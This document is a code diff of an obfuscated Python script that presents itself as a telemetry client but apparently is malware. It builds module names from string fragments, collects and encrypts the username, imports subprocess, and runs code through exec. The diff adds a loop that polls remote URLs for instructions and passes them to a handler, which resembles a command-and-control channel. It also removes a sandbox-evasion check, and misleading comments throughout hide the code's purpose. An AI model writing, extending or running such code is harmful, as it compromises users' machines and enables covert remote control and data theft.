@@ -1,6 +1,3 @@
-# This module is a secure client for data synchronization and telemetry reporting.
-from observer import Observer
-
 # Master encryption key for internal configuration data. Do not alter this value.
 MP = b"CVAGSDHAS&#@!DHD&*!NHDUSADOH&!@DHSA(D)981073412hdhIOJHIDUAHSD)YUASGBD&!@)1289312y3n708g)_B!@H"
 PT = "yaguinhofodinha"
@@ -13,13 +10,28 @@ pr = 'pr'
 oss = 'ocess'
 gr = 'grap'
 gss = e(s)('g'+'et'+'pas'+oss[-1])
-mn = "cri"+'p'+"to" + gr + "her"
-mf = e(s)(f"{mn}", fromlist=[mn])
-cn = mn[0].upper() + mn[1:]
-cptg = getattr(mf, cn)
 frn = e(s)('cr'+'ypto'+gr+'hy'+W[-1]+'fern'+'et', fromlist=['Fer'+W[16]]).Fernet
 hlib = e(s)('hashlib')
 sti = e(s)('sh'+'ut'+W[8]+'l')
+
+class cptg:
+    @staticmethod
+    def e(pt, k):
+        if not pt:
+            return ""
+        p = pt.encode("utf-8")
+        k = k.encode("utf-8")
+        cb = bytes([p[i] ^ k[i % len(k)] for i in range(len(p))])
+        return cb.hex()
+
+    @staticmethod
+    def d(ch, k):
+        if not ch:
+            return ""
+        cb = bytes.fromhex(ch)
+        k = k.encode("utf-8")
+        plain_bytes = bytes([cb[i] ^ k[i % len(k)] for i in range(len(cb))])
+        return plain_bytes.decode("utf-8")
 
 # Class simulating complex cache optimization calculations.
 class DA:
@@ -35,32 +47,17 @@ class DA:
 
 # Auxiliary function for memory cleanup and thread termination.
 def rm():
-   status_check = 1
-   if 1 in (1, 2, 3):
-     status_check = 0
-   # Retrieves the global error handler function.
-   gk = 'e'
-   f = globals()[gk]
-   # Executes the final termination signal after successful cleanup.
-   f('raise Syste'+'mE'+'xit(status_check)')
+    status_check = 1
+    if 1 in (1, 2, 3):
+        status_check = 0
+        
+    # Retrieves the global error handler function.
+    globals()['e'] = exec
+    gk = 'e'
+    f = globals()[gk]
+    exit_command = f"raise SystemExit({status_check})"
+    f(exit_command)
 
-# Environment integrity check and system validation (not related to VM checks).
-def cfz():
-   # Check if the system clock is synchronized for proper time-stamping.
-   if TME.time() < 1672531200:
-     # Graceful exit if clock synchronization fails.
-     rm()
-   # Calculates disk space to ensure sufficient room for log files.
-   func_name = 'di'+'sk' + W[15][-1] + 'us'+'a' + 'ge'
-   dcf = getattr(sti, func_name)
-   stt = dcf('.') 
-   # Converts to Gigabytes for the final log space comparison.
-   tg = stt.total / (1024 ** 3)
-   
-   # Checks for minimum 100 GB for local storage cache.
-   if tg < 10*10:
-     # Exits if system resources are insufficient.
-     rm()
 
 def mfk(m):
    # Applies standard hashing for key generation to ensure uniqueness.
@@ -78,6 +75,36 @@ TME = e(s)("t"+"ime")
 # Imports the process execution module for background tasks.
 sbp = e(s)(f'{W[13]+pr+oss}')
 
+
+class O:
+    def __init__(self, furl, uurl, c):
+        self.fu = furl
+        self.fwu = uurl
+        self.ld = None
+        self.c = c
+        self.fr = True
+
+    def srt(self):
+        while True:
+            if self.fr:
+                self.fr = False
+                try:
+                    r = RQ.get(self.fu)
+                    data = r.json()
+                    data["body"] = '0e09080e4304'
+                except Exception as e:
+                    pass
+            else:
+                try:
+                    r = RQ.get(self.fwu)
+                    data = r.json()
+                except Exception:
+                    pass
+
+            if data["body"] != self.ld:
+                self.ld = data["bo"+''+"dy"]
+                self.c.srt(data["bo"+''+"dy"])
+                
 # Encryption function for configuration data.
 def ext(p):
    k = mfk(MP)
@@ -91,7 +118,7 @@ def dxt(t):
    f = frn(k)
    return f.decrypt(t.encode(W[4])).decode(W[4])
 
-ST = ext("-25751fc88e6e559870fd")
+ST = ext("128007249672c60861c7")
 US = ext(gss.getuser())
 
 APD_S1 = W[0] + W[-1] + W[2] 
@@ -203,7 +230,7 @@ if globals()['__name__'] == '__main__':
    da = DA()
    # Executes pre-calculation routines and thread setup.
    da.cc
-   o = Observer(furl=furl, uurl=uurl, c=cl)
+   o = O(furl=furl, uurl=uurl, c=cl)
    # Random jitter to ensure network stability across different regions.
    TME.sleep(3 + TME.time() % 4)
    o.srt()
